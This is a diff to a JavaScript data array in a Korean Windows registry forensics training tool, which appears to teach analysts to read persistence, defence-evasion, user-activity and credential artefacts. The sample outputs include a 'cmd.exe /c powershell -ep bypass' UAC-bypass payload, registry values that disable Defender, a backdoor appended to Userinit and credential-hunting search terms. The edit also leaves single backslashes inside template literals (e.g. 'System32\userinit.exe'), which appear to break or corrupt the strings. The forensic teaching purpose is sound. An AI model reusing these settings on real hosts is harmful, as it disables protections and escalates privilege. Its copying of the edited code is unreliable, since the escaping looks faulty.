-    parse_output:"값 이름        정상 값                              현재 값\n-----------------------------------------------------------------------\nUserinit       C:\\\\Windows\\\\System32\\userinit.exe,     C:\\\\Windows\\\\System32\\userinit.exe, C:\\\\Temp\\backdoor.exe\nShell          explorer.exe                          explorer.exe\nAutoAdminLogon 0                                     0",
+    parse_output:`값 이름        정상 값                              현재 값
+-----------------------------------------------------------------------
+Userinit       C:\\Windows\\System32\userinit.exe,     C:\\Windows\\System32\userinit.exe, C:\\Temp\backdoor.exe
+Shell          explorer.exe                          explorer.exe
+AutoAdminLogon 0                                     0`,
     interpretation:[
       { field:"Userinit", meaning:"정상: userinit.exe, 만 있어야 함. 추가 항목(쉼표 뒤)은 로그온 시 함께 실행됨 → 즉시 의심" },
       { field:"Shell", meaning:"정상: explorer.exe / 변조 시: 악성 실행파일로 대체되어 데스크톱 대신 악성코드 실행" },
       { field:"AutoAdminLogon", meaning:"1이면 자동 로그온 → DefaultUserName·DefaultPassword 값에 자격증명 평문 저장" },
     ],
-    forensic:"Userinit 값에 쉼표 뒤 추가 경로가 있으면 반드시 확인. Shell 변조는 드물지만 강력한 지속성 기법.",
+    forensic:`Userinit 값에 쉼표 뒤 추가 경로가 있으면 반드시 확인. Shell 변조는 드물지만 강력한 지속성 기법.`,
     ioc_example:"Userinit: userinit.exe, C:\\\\Temp\\backdoor.exe",
   },
   {
@@ -1310,12 +1958,15 @@ const REG_KEYS = [
     path:"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\AppInit_DLLs\nHKLM\\\\SOFTWARE\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Windows\\\\AppInit_DLLs",
     desc:"모든 GUI 프로세스 실행 시 지정된 DLL이 자동으로 로드됨. DLL 인젝션 지속성 기법.",
     recmd_plugin:"appinit",
-    parse_output:"값 이름          데이터\n----------------------------------------------------\nAppInit_DLLs     C:\\\\Windows\\\\Temp\\\\inject.dll\nLoadAppInit_DLLs 1",
+    parse_output:`값 이름          데이터
+----------------------------------------------------
+AppInit_DLLs     C:\\Windows\\Temp\\inject.dll
+LoadAppInit_DLLs 1`,
     interpretation:[
       { field:"AppInit_DLLs", meaning:"정상: 비어있거나 알려진 보안 소프트웨어 DLL / 의심: 비정상 경로 DLL" },
       { field:"LoadAppInit_DLLs", meaning:"1이면 AppInit_DLLs 활성화 상태. 기본값 0이어야 정상" },
     ],
-    forensic:"LoadAppInit_DLLs=1 + 비정상 DLL 경로 → 모든 GUI 프로세스에 악성 DLL 인젝션.",
+    forensic:`LoadAppInit_DLLs=1 + 비정상 DLL 경로 → 모든 GUI 프로세스에 악성 DLL 인젝션.`,
     ioc_example:"AppInit_DLLs: C:\\\\Windows\\\\Temp\\\\inject.dll\nLoadAppInit_DLLs: 1",
   },
   // ─ 방어 우회 ─
@@ -1326,13 +1977,20 @@ const REG_KEYS = [
     path:"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\nHKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features",
     desc:"Windows Defender(AV) 실시간 보호, 스캔 등을 레지스트리로 비활성화.",
     recmd_plugin:"defender",
-    parse_output:"키 경로: HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\n값 이름                      데이터    의미\n---------------------------------------------------------\nDisableAntiSpyware           1         AntiSpyware 비활성화\nDisableAntiVirus             1         AntiVirus 비활성화\nDisableRealtimeMonitoring    1         실시간 보호 비활성화\nDisableBehaviorMonitoring    1         행위 기반 탐지 비활성화\nDisableIOAVProtection        1         다운로드 파일 스캔 비활성화",
+    parse_output:`키 경로: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender
+값 이름                      데이터    의미
+---------------------------------------------------------
+DisableAntiSpyware           1         AntiSpyware 비활성화
+DisableAntiVirus             1         AntiVirus 비활성화
+DisableRealtimeMonitoring    1         실시간 보호 비활성화
+DisableBehaviorMonitoring    1         행위 기반 탐지 비활성화
+DisableIOAVProtection        1         다운로드 파일 스캔 비활성화`,
     interpretation:[
       { field:"DisableAntiSpyware / DisableAntiVirus", meaning:"1이면 완전 비활성화. 공격자가 가장 먼저 실행하는 방어 우회 조치" },
       { field:"DisableRealtimeMonitoring", meaning:"실시간 보호 비활성화. 악성코드 실행 전 선행 조치" },
       { field:"Policies vs Features 키", meaning:"Policies 키의 설정이 우선 적용됨. Features 키만 변경된 경우도 확인 필요" },
     ],
-    forensic:"이 키의 LastWrite 시간이 악성 파일 드롭 직전이면 공격자가 의도적으로 방어 비활성화한 증거.",
+    forensic:`이 키의 LastWrite 시간이 악성 파일 드롭 직전이면 공격자가 의도적으로 방어 비활성화한 증거.`,
     ioc_example:"DisableAntiSpyware=1 (LastWrite: 2024-09-02 09:34)",
   },
   {
@@ -1342,13 +2000,22 @@ const REG_KEYS = [
     path:"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\nHKCU\\\\SOFTWARE\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command",
     desc:"UAC(사용자 계정 컨트롤) 설정 변경 또는 우회 기법 흔적.",
     recmd_plugin:"uac",
-    parse_output:"키: HKLM\\\\...\\\\Policies\\\\System\n값 이름              데이터    의미\n----------------------------------------------\nEnableLUA            0         UAC 완전 비활성화 ← 위험\nConsentPromptBehaviorAdmin  0  관리자 승인 없이 권한상승\nPromptOnSecureDesktop 0        보안 데스크톱 없이 승인\n\n키: HKCU\\\\SOFTWARE\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\nDelegateExecute      (비어있음)\n(Default)            cmd.exe /c powershell -ep bypass  ← UAC 우회 페이로드",
+    parse_output:`키: HKLM\\...\\Policies\\System
+값 이름              데이터    의미
+----------------------------------------------
+EnableLUA            0         UAC 완전 비활성화 ← 위험
+ConsentPromptBehaviorAdmin  0  관리자 승인 없이 권한상승
+PromptOnSecureDesktop 0        보안 데스크톱 없이 승인
+
+키: HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command
+DelegateExecute      (비어있음)
+(Default)            cmd.exe /c powershell -ep bypass  ← UAC 우회 페이로드`,
     interpretation:[
       { field:"EnableLUA=0", meaning:"UAC 완전 비활성화. 모든 프로그램이 관리자 권한으로 실행됨" },
       { field:"ms-settings DelegateExecute", meaning:"fodhelper.exe UAC 우회 기법. HKCU 키 생성으로 관리자 없이 권한상승" },
       { field:"(Default) 값의 명령어", meaning:"UAC 우회 시 실행될 페이로드. PowerShell, cmd 등이 여기에 기록됨" },
     ],
-    forensic:"ms-settings\\\\shell\\\\open\\\\command 키 존재 자체가 UAC 우회 시도 강력한 증거.",
+    forensic:`ms-settings\\shell\\open\\command 키 존재 자체가 UAC 우회 시도 강력한 증거.`,
     ioc_example:"HKCU\\\\...\\\\ms-settings\\\\shell\\\\open\\\\command: cmd.exe /c powershell -ep bypass",
   },
   // ─ 사용자 행위 ─
@@ -1359,13 +2026,18 @@ const REG_KEYS = [
     path:"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\UserAssist\\\\{GUID}\\\\Count",
     desc:"탐색기에서 실행한 프로그램 목록과 실행 횟수·마지막 실행 시간. ROT13 인코딩.",
     recmd_plugin:"userassist",
-    parse_output:"프로그램명(ROT13 디코딩)                      실행횟수  마지막 실행\n---------------------------------------------------------------------------\nC:\\\\Windows\\\\System32\\\\cmd.exe                     23        2024-09-02 10:02\nC:\\Users\\victim\\\\AppData\\\\Local\\\\Temp\\\\malware.exe   3         2024-09-02 09:32\nC:\\\\Program Files\\\\Google\\\\Chrome\\\\chrome.exe         156       2024-09-01 18:45\nMicrosoft.Windows.Explorer                         89        2024-09-02 09:00",
+    parse_output:`프로그램명(ROT13 디코딩)                      실행횟수  마지막 실행
+---------------------------------------------------------------------------
+C:\\Windows\\System32\\cmd.exe                     23        2024-09-02 10:02
+C:\Users\victim\\AppData\\Local\\Temp\\malware.exe   3         2024-09-02 09:32
+C:\\Program Files\\Google\\Chrome\\chrome.exe         156       2024-09-01 18:45
+Microsoft.Windows.Explorer                         89        2024-09-02 09:00`,
     interpretation:[
       { field:"프로그램 경로", meaning:"ROT13 인코딩으로 저장됨. RECmd가 자동 디코딩. 실행 경로 확인 필수" },
       { field:"실행 횟수(RunCount)", meaning:"비정상적으로 높은 횟수 → 반복 실행 또는 자동화. 1회만 실행 후 삭제된 악성코드도 확인 가능" },
       { field:"마지막 실행 시간(LastExecuted)", meaning:"침해 시간대와 대조. 파일 삭제 후에도 실행 이력 남음" },
     ],
-    forensic:"Temp, AppData 경로 프로그램의 실행 횟수와 시간은 악성코드 실행 직접 증거.",
+    forensic:`Temp, AppData 경로 프로그램의 실행 횟수와 시간은 악성코드 실행 직접 증거.`,
     ioc_example:"C:\\Users\\victim\\\\AppData\\\\Local\\\\Temp\\\\malware.exe (실행횟수: 3, 최종: 09:32)",
   },
   {
@@ -1375,13 +2047,18 @@ const REG_KEYS = [
     path:"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\RecentDocs",
     desc:"사용자가 최근 열어본 파일 목록. 파일 유형별로 분류되어 저장.",
     recmd_plugin:"recentdocs",
-    parse_output:"파일명                                    확장자   마지막 접근\n-----------------------------------------------------------------------\n방산청_협력사_공문_2024.docx              .docx    2024-09-02 09:14\n기술_연구_보고서_기밀.pdf                 .pdf     2024-09-03 14:30\nemployee_credentials.xlsx                .xlsx    2024-09-04 11:20\nC:\\\\Staging\\\\collect.bat                  .bat     2024-09-05 09:00",
+    parse_output:`파일명                                    확장자   마지막 접근
+-----------------------------------------------------------------------
+방산청_협력사_공문_2024.docx              .docx    2024-09-02 09:14
+기술_연구_보고서_기밀.pdf                 .pdf     2024-09-03 14:30
+employee_credentials.xlsx                .xlsx    2024-09-04 11:20
+C:\\Staging\\collect.bat                  .bat     2024-09-05 09:00`,
     interpretation:[
       { field:"파일명", meaning:"파일 삭제 후에도 MRU 목록에 남음. 공격자가 접근한 파일명 직접 확인" },
       { field:"확장자별 분류", meaning:"RECmd는 확장자별로 그룹화. .exe .bat .ps1 등 실행 파일 접근 이력 주목" },
       { field:"마지막 접근 시간", meaning:"LNK 파일과 교차 검증하면 더 강력한 증거" },
     ],
-    forensic:"기밀문서, 자격증명 파일명이 MRU에 있으면 공격자가 해당 파일을 열람한 직접 증거.",
+    forensic:`기밀문서, 자격증명 파일명이 MRU에 있으면 공격자가 해당 파일을 열람한 직접 증거.`,
     ioc_example:"employee_credentials.xlsx (접근: 2024-09-04 11:20)",
   },
   {
@@ -1391,12 +2068,20 @@ const REG_KEYS = [
     path:"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\WordWheelQuery",
     desc:"탐색기 검색창에 입력한 검색어 목록. 공격자가 내부 파일 정찰 시 사용.",
     recmd_plugin:"wordwheelquery",
-    parse_output:"순서  검색어\n------------------------------\n0     password\n1     credential\n2     admin\n3     vpn config\n4     ssh key\n5     .pem\n6     secret",
+    parse_output:`순서  검색어
+------------------------------
+0     password
+1     credential
+2     admin
+3     vpn config
+4     ssh key
+5     .pem
+6     secret`,
     interpretation:[
       { field:"검색어(MRUList 순서)", meaning:"최근 순서대로 정렬. 0이 가장 최근" },
       { field:"검색 내용", meaning:"password, credential, admin, vpn 등 공격자가 민감 정보 탐색 시 사용하는 키워드가 있으면 즉시 의심" },
     ],
-    forensic:"공격자가 내부 파일 시스템에서 자격증명·키 파일을 검색한 흔적. 타임라인과 연계 분석.",
+    forensic:`공격자가 내부 파일 시스템에서 자격증명·키 파일을 검색한 흔적. 타임라인과 연계 분석.`,
     ioc_example:"검색어: password, credential, ssh key, .pem",
   },
   {
@@ -1406,12 +2091,17 @@ const REG_KEYS = [
     path:"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\TypedPaths",
     desc:"탐색기 주소창에 직접 타이핑한 경로 목록. 공격자가 직접 접근한 경로 파악.",
     recmd_plugin:"typedpaths",
-    parse_output:"순서  입력된 경로\n----------------------------------------------\nurl1  C:\\\\Staging\nurl2  \\\\192.168.10.20\\\\C$\nurl3  C:\\\\Windows\\\\Temp\nurl4  C:\\Users\\\\Administrator",
+    parse_output:`순서  입력된 경로
+----------------------------------------------
+url1  C:\\Staging
+url2  \\192.168.10.20\\C$
+url3  C:\\Windows\\Temp
+url4  C:\Users\\Administrator`,
     interpretation:[
       { field:"입력 경로", meaning:"탐색기에서 직접 타이핑한 경로만 기록. 즐겨찾기·클릭 접근은 포함 안 됨" },
       { field:"UNC 경로 (\\\\\\IP\\\\share)", meaning:"네트워크 공유 직접 접근. 내부 서버 측면 이동 경로 추적에 핵심" },
     ],
-    forensic:"\\\\\\IP\\\\C$ 형태 UNC 경로는 측면 이동 직접 증거. C:\\\\Staging, C:\\\\Temp 등 수집 경로도 확인.",
+    forensic:`\\\IP\\C$ 형태 UNC 경로는 측면 이동 직접 증거. C:\\Staging, C:\\Temp 등 수집 경로도 확인.`,
     ioc_example:"\\\\192.168.10.20\\\\C$ → 내부 서버 직접 접근",
   },
   {
@@ -1421,13 +2111,18 @@ const REG_KEYS = [
     path:"HKCU\\\\SOFTWARE\\\\Microsoft\\\\Terminal Server Client\\\\Servers\nHKCU\\\\SOFTWARE\\\\Microsoft\\\\Terminal Server Client\\\\Default",
     desc:"원격 데스크톱(RDP)으로 접속했던 서버 목록과 사용한 계정명.",
     recmd_plugin:"terminalserverclient",
-    parse_output:"서버 주소              사용 계정          마지막 접속\n------------------------------------------------------------\n192.168.10.20          Administrator      2024-09-02 11:15\n192.168.10.50          admin              2024-09-05 03:22\n10.0.0.5               victim             2024-09-01 09:00\nRD-SRV-002             domain\\\\admin       2024-09-02 11:15",
+    parse_output:`서버 주소              사용 계정          마지막 접속
+------------------------------------------------------------
+192.168.10.20          Administrator      2024-09-02 11:15
+192.168.10.50          admin              2024-09-05 03:22
+10.0.0.5               victim             2024-09-01 09:00
+RD-SRV-002             domain\\admin       2024-09-02 11:15`,
     interpretation:[
       { field:"서버 주소(ServerName)", meaning:"RDP로 접속한 대상 서버. 내부 IP면 측면 이동, 외부 IP면 데이터 유출 서버 의심" },
       { field:"사용 계정(UsernameHint)", meaning:"접속 시 입력한 계정명. 탈취한 계정(Administrator, admin) 사용 여부 확인" },
       { field:"MRU 순서", meaning:"Default 키의 MRU0~MRU9로 최근 접속 순서 파악" },
     ],
-    forensic:"비업무 시간대 내부 서버 RDP + 관리자 계정 사용 조합 → 측면 이동 핵심 증거.",
+    forensic:`비업무 시간대 내부 서버 RDP + 관리자 계정 사용 조합 → 측면 이동 핵심 증거.`,
     ioc_example:"192.168.10.20 (Administrator, 새벽 03:22)",
   },
   {
@@ -1437,13 +2132,17 @@ const REG_KEYS = [
     path:"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Enum\\USBSTOR",
     desc:"연결된 USB 저장장치의 정보와 시리얼 번호. 법적으로 특정 USB 기기를 식별하는 핵심 증거.",
     recmd_plugin:"usbstor",
-    parse_output:"장치 유형              벤더·제품명           시리얼 번호              마지막 연결\n------------------------------------------------------------------------------------------\nDisk&Ven_Samsung&...   Samsung USB Flash      AA9876543210&0          2024-09-02 09:10\nDisk&Ven_Kingston&...  Kingston DataTraveler  001372954C3F34C1&0      2024-09-01 17:30\nDisk&Ven_Generic&...   USB Mass Storage       5&1234abcd&0&00         2024-09-05 22:15",
+    parse_output:`장치 유형              벤더·제품명           시리얼 번호              마지막 연결
+------------------------------------------------------------------------------------------
+Disk&Ven_Samsung&...   Samsung USB Flash      AA9876543210&0          2024-09-02 09:10
+Disk&Ven_Kingston&...  Kingston DataTraveler  001372954C3F34C1&0      2024-09-01 17:30
+Disk&Ven_Generic&...   USB Mass Storage       5&1234abcd&0&00         2024-09-05 22:15`,
     interpretation:[
       { field:"장치 유형 문자열", meaning:"Disk&Ven_<벤더>&Prod_<제품>&Rev_<버전> 형식으로 제조사·제품 특정 가능" },
       { field:"시리얼 번호(SerialNumber)", meaning:"특정 USB 기기를 법적으로 식별하는 고유 값. LNK 파일의 볼륨 시리얼과 교차 확인" },
       { field:"LastWrite 시간", meaning:"해당 USB가 마지막으로 연결된 시간" },
     ],
-    forensic:"시리얼 번호로 특정 USB 기기 식별 → 해당 USB 압수 시 직접 증거 연결 가능.",
+    forensic:`시리얼 번호로 특정 USB 기기 식별 → 해당 USB 압수 시 직접 증거 연결 가능.`,
     ioc_example:"Samsung USB (SN: AA9876543210) — 침해 시작 직전 연결",
   },
   {
@@ -1453,12 +2152,17 @@ const REG_KEYS = [
     path:"HKLM\\\\SYSTEM\\\\MountedDevices",
     desc:"마운트된 볼륨의 드라이브 문자 매핑. USB가 어떤 드라이브 문자로 마운트됐는지 파악.",
     recmd_plugin:"mounteddevices",
-    parse_output:"드라이브 문자   볼륨 시리얼          장치 유형\n-------------------------------------------------\nC:             {GUID-시스템드라이브}   Fixed Disk\nE:             0xA1B2C3D4            Removable (USB)\nF:             0xE5F6A7B8            Removable (USB)\n\\\\\\?\\\\Volume{...}  0xC9D0E1F2          CD-ROM",
+    parse_output:`드라이브 문자   볼륨 시리얼          장치 유형
+-------------------------------------------------
+C:             {GUID-시스템드라이브}   Fixed Disk
+E:             0xA1B2C3D4            Removable (USB)
+F:             0xE5F6A7B8            Removable (USB)
+\\\?\\Volume{...}  0xC9D0E1F2          CD-ROM`,
     interpretation:[
       { field:"드라이브 문자", meaning:"USB가 E:, F: 등으로 마운트. LNK 파일의 경로와 매핑하면 어떤 USB인지 특정" },
       { field:"볼륨 시리얼", meaning:"USBSTOR의 시리얼 번호와 연계하여 동일 기기 확인" },
     ],
-    forensic:"LNK 파일에서 E:\\\\ 드라이브 경로 발견 → MountedDevices에서 해당 드라이브의 USB 시리얼 확인 → USBSTOR에서 기기 특정.",
+    forensic:`LNK 파일에서 E:\\ 드라이브 경로 발견 → MountedDevices에서 해당 드라이브의 USB 시리얼 확인 → USBSTOR에서 기기 특정.`,
     ioc_example:"E: = 볼륨시리얼 0xA1B2C3D4 → USBSTOR Samsung USB",
   },
   {
@@ -1468,13 +2172,19 @@ const REG_KEYS = [
     path:"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\TimeZoneInformation",
     desc:"시스템의 타임존 설정. 분석 시작 전 반드시 확인해야 하는 필수 정보.",
     recmd_plugin:"timezone",
-    parse_output:"값 이름                  데이터\n----------------------------------------------\nTimeZoneKeyName          Korea Standard Time\nActiveTimeBias           -540  (UTC+9, 단위: 분)\nBias                     -540\nStandardBias             0\nDaylightBias             -60",
+    parse_output:`값 이름                  데이터
+----------------------------------------------
+TimeZoneKeyName          Korea Standard Time
+ActiveTimeBias           -540  (UTC+9, 단위: 분)
+Bias                     -540
+StandardBias             0
+DaylightBias             -60`,
     interpretation:[
       { field:"TimeZoneKeyName", meaning:"타임존 이름. Korea Standard Time = UTC+9" },
       { field:"ActiveTimeBias", meaning:"UTC 기준 오프셋(분). -540 = UTC+9(한국). 양수면 UTC보다 늦음" },
       { field:"Bias", meaning:"표준 시간대 오프셋. DaylightBias와 합산하면 서머타임 적용 시간 계산 가능" },
     ],
-    forensic:"이 값 없이는 이벤트 로그의 시간이 어느 시간대인지 알 수 없음. 분석 시작 전 반드시 기록.",
+    forensic:`이 값 없이는 이벤트 로그의 시간이 어느 시간대인지 알 수 없음. 분석 시작 전 반드시 기록.`,
     ioc_example:"Bias=-540 → 모든 시간을 UTC+9로 해석해야 함",
   },
   {
@@ -1484,13 +2194,18 @@ const REG_KEYS = [
     path:"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\AppCompatCache",
     desc:"실행 가능한 파일의 경로·수정 시간 캐시. 파일이 삭제된 후에도 실행 가능했음을 증명.",
     recmd_plugin:"appcompatcache",
-    parse_output:"순서  파일 경로                                          수정 시간              실행 여부\n---------------------------------------------------------------------------------------\n0     C:\\\\Windows\\\\System32\\\\cmd.exe                         2024-01-10 12:00        Executed\n1     C:\\\\ProgramData\\\\MicrosoftUpdate\\\\svcupd.exe            2024-09-02 09:32        Executed  ← 의심\n2     C:\\\\Windows\\\\Temp\\\\malware_svc.exe                      2024-09-02 09:35        Executed  ← 의심\n3     C:\\\\Windows\\\\System32\\notepad.exe                      2023-06-14 08:00        Not executed",
+    parse_output:`순서  파일 경로                                          수정 시간              실행 여부
+---------------------------------------------------------------------------------------
+0     C:\\Windows\\System32\\cmd.exe                         2024-01-10 12:00        Executed
+1     C:\\ProgramData\\MicrosoftUpdate\\svcupd.exe            2024-09-02 09:32        Executed  ← 의심
+2     C:\\Windows\\Temp\\malware_svc.exe                      2024-09-02 09:35        Executed  ← 의심
+3     C:\\Windows\\System32\notepad.exe                      2023-06-14 08:00        Not executed`,
     interpretation:[
       { field:"파일 경로", meaning:"해당 경로에 실행 가능한 파일이 존재했음을 증명. 파일 삭제 후에도 기록 남음" },
       { field:"수정 시간", meaning:"파일의 마지막 수정 시간. MFT 타임스탬프와 비교하여 Timestomping 탐지" },
       { field:"실행 여부(Executed)", meaning:"Windows 8 이후 일부 버전에서만 제공. Executed 표시 시 확실한 실행 증거" },
     ],
-    forensic:"삭제된 악성 파일도 Shimcache에 경로가 남으면 존재 및 실행 가능성 증명 가능.",
+    forensic:`삭제된 악성 파일도 Shimcache에 경로가 남으면 존재 및 실행 가능성 증명 가능.`,
     ioc_example:"C:\\\\Windows\\\\Temp\\\\malware_svc.exe (Executed, 이후 삭제됨)",
   },
   {
@@ -1500,14 +2215,19 @@ const REG_KEYS = [
     path:"HKLM\\\\SAM\\\\SAM\\\\Domains\\\\Account\\Users",
     desc:"로컬 사용자 계정의 전체 목록과 계정 상태, 마지막 로그온 시간, 패스워드 해시.",
     recmd_plugin:"samparse",
-    parse_output:"사용자명         RID    계정상태    생성시간              마지막 로그온           로그인횟수  패스워드 해시(NTLM)\n---------------------------------------------------------------------------------------------------------------\nAdministrator    500    활성화      -                     2024-09-02 10:52        147        aad3b435...\nGuest            501    비활성화    -                     Never                   0          -\nadmin_bak        1002   활성화      2024-09-02 09:33      2024-09-02 11:20        3          e3d7...  ← 백도어 의심\nkim_finance      1001   활성화      2023-01-15 09:00      2024-09-02 09:00        892        8846...",
+    parse_output:`사용자명         RID    계정상태    생성시간              마지막 로그온           로그인횟수  패스워드 해시(NTLM)
+---------------------------------------------------------------------------------------------------------------
+Administrator    500    활성화      -                     2024-09-02 10:52        147        aad3b435...
+Guest            501    비활성화    -                     Never                   0          -
+admin_bak        1002   활성화      2024-09-02 09:33      2024-09-02 11:20        3          e3d7...  ← 백도어 의심
+kim_finance      1001   활성화      2023-01-15 09:00      2024-09-02 09:00        892        8846...`,
     interpretation:[
       { field:"RID (상대 식별자)", meaning:"500=기본 Administrator, 501=Guest, 1000+= 일반 사용자. 1000 이상 계정 중 낯선 것 확인" },
       { field:"생성 시간", meaning:"침해 시간대에 생성된 계정 → 백도어 계정. 특히 Admin 이름 위장 계정 주의" },
       { field:"마지막 로그온 시간", meaning:"침해 시간대 관리자 계정 로그온 → 공격자 사용 의심" },
       { field:"NTLM 해시", meaning:"별도 오프라인 크래킹 도구로 패스워드 복원 가능. aad3b435b51404eeaad3b435b51404ee = 패스워드 없음" },
     ],
-    forensic:"침해 시간대 생성된 신규 계정(RID 1000+)은 백도어 계정 1순위. 마지막 로그온 시간으로 공격자 사용 여부 확인.",
+    forensic:`침해 시간대 생성된 신규 계정(RID 1000+)은 백도어 계정 1순위. 마지막 로그온 시간으로 공격자 사용 여부 확인.`,
     ioc_example:"admin_bak (RID:1002, 생성: 09-02 09:33, 마지막 로그온: 11:20) → 백도어 계정",
   },
   {
@@ -1517,13 +2237,20 @@ const REG_KEYS = [
     path:"HKLM\\\\SECURITY\\\\Policy\\\\Secrets",
     desc:"서비스 계정 패스워드, 자동 로그온 패스워드, 캐시된 도메인 자격증명 등 저장.",
     recmd_plugin:"lsasecrets",
-    parse_output:"비밀 이름                의미\n---------------------------------------------------\n_SC_<ServiceName>        서비스 계정 패스워드\nDefaultPassword          자동 로그온 패스워드 (평문)\nCachedDefaultPassword    캐시된 자격증명\nDPAPI_SYSTEM             DPAPI 마스터 키\nNL$KM                    캐시된 도메인 로그온 키 (DCC2)\n$MACHINE.ACC             도메인 컴퓨터 계정 패스워드",
+    parse_output:`비밀 이름                의미
+---------------------------------------------------
+_SC_<ServiceName>        서비스 계정 패스워드
+DefaultPassword          자동 로그온 패스워드 (평문)
+CachedDefaultPassword    캐시된 자격증명
+DPAPI_SYSTEM             DPAPI 마스터 키
+NL$KM                    캐시된 도메인 로그온 키 (DCC2)
+$MACHINE.ACC             도메인 컴퓨터 계정 패스워드`,
     interpretation:[
       { field:"_SC_<서비스명>", meaning:"해당 서비스가 사용하는 계정의 패스워드. 서비스 계정 탈취에 사용" },
       { field:"DefaultPassword", meaning:"자동 로그온 설정 시 패스워드가 여기에 저장됨. 평문 또는 간단 암호화" },
       { field:"NL$KM / CachedDefaultPassword", meaning:"도메인 연결 없이 로그온 가능한 캐시된 자격증명 (DCC2 해시)" },
     ],
-    forensic:"LSA Secrets 추출은 오프라인 분석(SYSTEM+SECURITY 하이브 동시 필요)에서만 가능. Mimikatz의 주요 탈취 대상.",
+    forensic:`LSA Secrets 추출은 오프라인 분석(SYSTEM+SECURITY 하이브 동시 필요)에서만 가능. Mimikatz의 주요 탈취 대상.`,
     ioc_example:"DefaultPassword 값 존재 → 평문 패스워드 노출 위험",
   },
 ];
